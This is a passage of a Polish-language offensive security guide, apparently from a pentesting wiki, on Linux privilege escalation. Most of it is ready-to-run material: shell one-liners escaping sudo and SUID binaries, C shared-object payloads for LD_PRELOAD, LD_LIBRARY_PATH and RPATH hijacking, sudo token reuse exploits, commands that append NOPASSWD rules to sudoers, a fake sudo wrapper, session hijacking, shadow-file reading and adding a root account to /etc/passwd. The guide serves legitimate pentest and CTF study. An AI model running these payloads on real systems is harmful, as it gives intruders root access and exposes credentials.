D-Bus działa w oparciu o model **zezwól/odmów**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie łącznego efektu zgodnych z zasadami polityk. Te polityki określają interakcje z magistralą, potencjalnie umożliwiając eskalację uprawnień poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` jest podany, szczegółowo opisując uprawnienia dla użytkownika roota do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalne, podczas gdy polityki kontekstu "domyślnego" mają zastosowanie do wszystkich, którzy nie są objęci innymi konkretnymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak wyliczyć i wykorzystać komunikację D-Bus tutaj:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Sieć**

Zawsze interesujące jest wyliczenie sieci i ustalenie pozycji maszyny.

### Ogólne wyliczenie
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi wcześniej nie byłeś w stanie wchodzić w interakcje przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Podsłuchiwanie

Sprawdź, czy możesz podsłuchiwać ruch sieciowy. Jeśli tak, możesz być w stanie przechwycić pewne dane uwierzytelniające.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź **kto** jesteś, jakie **uprawnienia** posiadasz, którzy **użytkownicy** są w systemach, którzy mogą się **zalogować** oraz którzy posiadają uprawnienia **root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duże UID

Niektóre wersje Linuxa były dotknięte błędem, który pozwala użytkownikom z **UID > INT\_MAX** na eskalację uprawnień. Więcej informacji: [tutaj](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tutaj](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [tutaj](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj to** używając: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać Ci uprawnienia roota:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka hasła
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli znasz **jakiekolwiek hasło** środowiska, **spróbuj zalogować się jako każdy użytkownik** używając hasła.

### Su Brute

Jeśli nie masz nic przeciwko generowaniu dużej ilości hałasu i binarne pliki `su` oraz `timeout` są obecne na komputerze, możesz spróbować przeprowadzić atak siłowy na użytkownika za pomocą [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić atak siłowy na użytkowników.

## Nadużycia zapisywalnych ścieżek

### $PATH

Jeśli odkryjesz, że możesz **pisać wewnątrz pewnego folderu z $PATH**, możesz próbować eskalować uprawnienia, tworząc **tylnie drzwi w zapisywalnym folderze** o nazwie jakiejś komendy, która zostanie wykonana przez innego użytkownika (najlepiej roota) i która **nie jest wczytywana z folderu znajdującego się wcześniej** niż twój zapisywalny folder w $PATH.

### SUDO i SUID

Możesz mieć uprawnienia do wykonania pewnej komendy za pomocą sudo lub mogą mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczytanie i/lub zapisanie plików, a nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może pozwolić użytkownikowi na wykonanie pewnej komendy z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`, teraz jest banalnie łatwo uzyskać dostęp do powłoki, dodając klucz ssh do katalogu root lub wywołując `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
To przykład, **oparty na maszynie HTB Admirer**, był **podatny** na **przechwycenie PYTHONPATH** w celu załadowania dowolnej biblioteki pythona podczas wykonywania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Pomijanie ścieżek wykonania Sudo

**Skok** do odczytu innych plików lub użyj **symlinków**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli używany jest **znak wieloznaczny** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Przeciwdziałania**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Polecenie Sudo/binarny SUID bez ścieżki polecenia

Jeśli **uprawnienia sudo** są nadane dla pojedynczego polecenia **bez określania ścieżki**: _hacker10 ALL= (root) less_, można to wykorzystać zmieniając zmienną PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli binarny **suid** **wykonuje inne polecenie bez określania ścieżki do niego (zawsze sprawdzaj zawartość dziwnego binarnego pliku SUID za pomocą** _**strings**_**)**.

[Przykłady ładunków do wykonania.](payloads-to-execute.md)

### Binarne SUID z ścieżką polecenia

Jeśli binarny **suid** **wykonuje inne polecenie, określając ścieżkę**, wtedy można spróbować **wyeksportować funkcję** o nazwie takiej jak polecenie, które wywołuje plik suid.

Na przykład, jeśli binarny suid wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować utworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Zmienna środowiskowa **LD\_PRELOAD** służy do określenia jednej lub więcej bibliotek współdzielonych (.so), które mają być załadowane przez ładowacz przed wszystkimi innymi, w tym standardową bibliotekę C (`libc.so`). Ten proces jest znany jako wczytywanie biblioteki.

Jednakże, aby utrzymać bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, zwłaszcza w przypadku plików wykonywalnych **suid/sgid**, system narzuca pewne warunki:

* Ładowacz ignoruje **LD\_PRELOAD** dla plików wykonywalnych, w których rzeczywiste ID użytkownika (_ruid_) nie pasuje do efektywnego ID użytkownika (_euid_).
* Dla plików wykonywalnych z ustawionymi bitami suid/sgid, wczytywane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają ustawione bity suid/sgid.

Eskalacja uprawnień może wystąpić, jeśli masz możliwość wykonywania poleceń za pomocą `sudo`, a wynik `sudo -l` zawiera instrukcję **env\_keep+=LD\_PRELOAD**. Ta konfiguracja pozwala zmiennej środowiskowej **LD\_PRELOAD** pozostać i być rozpoznaną nawet podczas uruchamiania poleceń za pomocą `sudo`, co potencjalnie prowadzi do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
W końcu, **zwiększ uprawnienia** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Podobne eskalacje uprawnień mogą być wykorzystane, jeśli atakujący kontroluje zmienną środowiskową **LD\_LIBRARY\_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binarne SUID – wstrzykiwanie .so

Gdy napotkasz binarny plik z uprawnieniami **SUID**, które wydają się nietypowe, dobrą praktyką jest sprawdzenie, czy poprawnie wczytuje pliki **.so**. Można to sprawdzić, wykonując poniższą komendę:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład napotkanie błędu typu _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjał do wykorzystania.

Aby to wykorzystać, należy przejść do utworzenia pliku C, powiedzmy _"/path/to/.config/libcalc.c"_, zawierającego następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i wykonaniu, ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie powłoki z podniesionymi uprawnieniami.

Skompiluj powyższy plik C do pliku obiektowego współdzielonego (.so) za pomocą polecenia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## Współdzielone przejęcie obiektu

Wreszcie, uruchomienie dotkniętego binarnego pliku SUID powinno wywołać eksploit, umożliwiając potencjalne skompromitowanie systemu.
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy binarny plik SUID ładujący bibliotekę z folderu, w którym możemy pisać, utwórzmy bibliotekę w tym folderze o odpowiedniej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
To oznacza, że wygenerowana przez Ciebie biblioteka musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to starannie wyselekcjonowany spis binarnych plików Unix, które mogą zostać wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) działa na podobnej zasadzie, ale dotyczy przypadków, w których można **tylko wstrzykiwać argumenty** do polecenia.

Projekt zbiera legalne funkcje binarnych plików Unix, które mogą zostać nadużyte do wyjścia z ograniczonych powłok, eskalacji lub utrzymania podwyższonych uprawnień, transferu plików, uruchamiania powłok typu bind i reverse, oraz ułatwiania innych zadań związanych z eksploatacją po przejęciu systemu.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz skorzystać z narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajduje sposób na wykorzystanie jakiejkolwiek reguły sudo.

### Ponowne wykorzystanie tokenów Sudo

W przypadkach, gdy masz **dostęp do `sudo`**, ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejęcie tokena sesji**.

Wymagania do eskalacji uprawnień:

* Masz już dostęp do powłoki jako użytkownik "_sampleuser_"
* "_sampleuser_" **użył `sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie jest to czas trwania tokenu sudo, który pozwala nam używać `sudo` bez konieczności podawania hasła)
* `cat /proc/sys/kernel/yama/ptrace_scope` wynosi 0
* `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` poleceniem `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub na stałe, modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli spełnione są wszystkie te wymagania, **możesz eskalować uprawnienia za pomocą:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **Pierwsze narzędzie eksploitacji** (`exploit.sh`) utworzy binarny plik `activate_sudo_token` w _/tmp_. Możesz go użyć do **aktywacji tokenu sudo w swojej sesji** (nie otrzymasz automatycznie powłoki roota, wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Drugie wykorzystanie (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **należącą do roota z ustawionym setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Trzeci exploit (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **tokeny sudo będą wieczne i umożliwi wszystkim użytkownikom korzystanie z sudo**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<NazwaUżytkownika>

Jeśli masz **uprawnienia do zapisu** w folderze lub do któregokolwiek z utworzonych plików wewnątrz folderu, możesz użyć binarnego pliku [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools), aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz powłokę jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez konieczności znajomości hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki wewnątrz `/etc/sudoers.d` konfigurują, kto może używać `sudo` oraz w jaki sposób. Te pliki **domyślnie mogą być czytane tylko przez użytkownika root i grupę root**.\
**Jeśli** jesteś w stanie **czytać** ten plik, możesz **uzyskać pewne interesujące informacje**, a jeśli możesz **pisać** do jakiegokolwiek pliku, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli potrafisz pisać, możesz nadużyć tego uprawnienia
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją pewne alternatywy dla binarnej aplikacji `sudo`, takie jak `doas` dla OpenBSD, pamiętaj, aby sprawdzić jego konfigurację w lokalizacji `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Przechwytywanie Sudo

Jeśli wiesz, że **użytkownik zazwyczaj łączy się z maszyną i używa `sudo`** do eskalacji uprawnień, a ty masz dostęp do powłoki w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który będzie wykonywał twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** kontekstu użytkownika (na przykład dodając nową ścieżkę w .bash\_profile), aby po wykonaniu sudo przez użytkownika, został wykonany twój plik wykonywalny sudo.

Zauważ, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Albo uruchom coś w stylu:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą załadowane pliki konfiguracyjne**. Zazwyczaj plik ten zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **szukane biblioteki**. Na przykład zawartość pliku `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie szukał bibliotek wewnątrz `/usr/local/lib`**.

Jeśli z **jakiegoś powodu użytkownik ma uprawnienia do zapisu** w którymkolwiek z podanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, jakikolwiek plik wewnątrz `/etc/ld.so.conf.d/` lub jakikolwiek folder wewnątrz pliku konfiguracyjnego w `/etc/ld.so.conf.d/*.conf`, może być w stanie eskalować uprawnienia.\
Zobacz **jak wykorzystać tę błędną konfigurację** na następnej stronie:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Poprzez skopiowanie biblioteki do `/var/tmp/flag15/` zostanie ona użyta przez program w tym miejscu, jak określono w zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uprawnienia

Zdolności systemu Linux zapewniają **podzbiór dostępnych uprawnień roota dla procesu**. W efekcie to **rozbija uprawnienia roota na mniejsze i odrębne jednostki**. Każda z tych jednostek może być niezależnie przyznana procesom. W ten sposób pełen zestaw uprawnień jest zmniejszony, co zmniejsza ryzyko eksploatacji.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o zdolnościach i jak je nadużywać**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Uprawnienia katalogów

W katalogu **bit "execute"** oznacza, że dotknięty użytkownik może **"cd"** do folderu.\
Bit **"read"** oznacza, że użytkownik może **wyświetlić** **pliki**, a bit **"write"** oznacza, że użytkownik może **usunąć** i **tworzyć** nowe **pliki**.

## ACL

Listy kontroli dostępu (ACL) reprezentują drugą warstwę dyskrecyjnych uprawnień, zdolnych do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do pliku lub katalogu, pozwalając na przyznawanie lub odmawianie praw określonym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **dokładności zapewnia bardziej precyzyjne zarządzanie dostępem**. Więcej szczegółów można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Daj** użytkownikowi "kali" uprawnienia do odczytu i zapisu pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACL-ami z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwieranie sesji powłoki

W **starych wersjach** możesz **przejąć kontrolę** nad sesją powłoki innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **połączyć się** tylko z sesjami ekranowymi **twojego własnego użytkownika**. Niemniej jednak, możesz znaleźć **interesujące informacje wewnątrz sesji**.

### przejmowanie sesji ekranowych

**Lista sesji ekranowych**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## przejmowanie sesji tmux

Był to problem z **starymi wersjami tmux**. Nie mogłem przejąć sesji tmux (v2.1) utworzonej przez roota jako użytkownik nieuprzywilejowany.

**Lista sesji tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box z HTB** jako przykład.

## SSH

### Debian OpenSSL Przewidywalny PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, itp.) między wrześniem 2006 a 13 maja 2008 mogą być dotknięte tym błędem.\
Ten błąd występuje podczas tworzenia nowego klucza ssh w tych systemach operacyjnych, ponieważ **było możliwych tylko 32 768 wariacji**. Oznacza to, że wszystkie możliwości można obliczyć i **posiadając klucz publiczny ssh, można wyszukać odpowiadający mu klucz prywatny**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Interesujące wartości konfiguracji SSH

* **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Wartość domyślna to `no`.
* **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą klucza publicznego jest dozwolone. Wartość domyślna to `yes`.
* **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer zezwala na logowanie do kont z pustymi ciągami hasła. Wartość domyślna to `no`.

### PermitRootLogin

Określa, czy root może zalogować się za pomocą ssh, domyślnie jest `no`. Możliwe wartości:

* `yes`: root może zalogować się za pomocą hasła i klucza prywatnego
* `without-password` lub `prohibit-password`: root może zalogować się tylko za pomocą klucza prywatnego
* `forced-commands-only`: Root może zalogować się tylko za pomocą klucza prywatnego i jeśli są określone opcje poleceń
* `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, które mogą być używane do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione przez katalog domowy. **Możesz wskazać ścieżki bezwzględne** (zaczynające się od `/`) lub **ścieżki względne od katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się za pomocą klucza **prywatnego** użytkownika "**nazwa_testowego_użytkownika**", ssh porówna klucz publiczny Twojego klucza z tymi znajdującymi się w `/home/nazwa_testowego_użytkownika/.ssh/authorized_keys` i `/home/nazwa_testowego_użytkownika/access`

### ForwardAgent/AllowAgentForwarding

Przekazywanie agenta SSH pozwala Ci **używać lokalnych kluczy SSH zamiast pozostawiać klucze** (bez haseł!) na Twoim serwerze. Dzięki temu będziesz mógł **przeskoczyć** za pomocą ssh **do hosta** i stamtąd **przeskoczyć do innego** hosta **korzystając z** klucza znajdującego się na Twoim **początkowym hoście**.

Musisz ustawić tę opcję w pliku `$HOME/.ssh.config` w ten sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` to `*`, za każdym razem gdy użytkownik przejdzie na inną maszynę, ta maszyna będzie miała dostęp do kluczy (co stanowi problem związany z bezpieczeństwem).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zabronić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwolić** lub **zabronić** przekazywanie ssh-agenta za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie jest zezwolone).

Jeśli zauważysz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz go wykorzystać do eskalacji uprawnień**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Interesujące Pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w `/etc/profile.d/` to **skrypty wykonywane, gdy użytkownik uruchamia nową powłokę**. Dlatego jeśli **możesz zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz jakikolwiek dziwny skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych danych**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub istnieć kopie zapasowe. Dlatego zaleca się **znalezienie wszystkich** i **sprawdzenie, czy możesz je odczytać**, aby zobaczyć, **czy zawierają hashe** wewnątrz plików:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych sytuacjach można znaleźć **hashe haseł** wewnątrz pliku `/etc/passwd` (lub równoważnego)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednej z poniższych poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Następnie dodaj użytkownika `hacker` i wprowadź wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Na przykład: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie, możesz użyć poniższych linii, aby dodać użytkownika z pustym hasłem.\
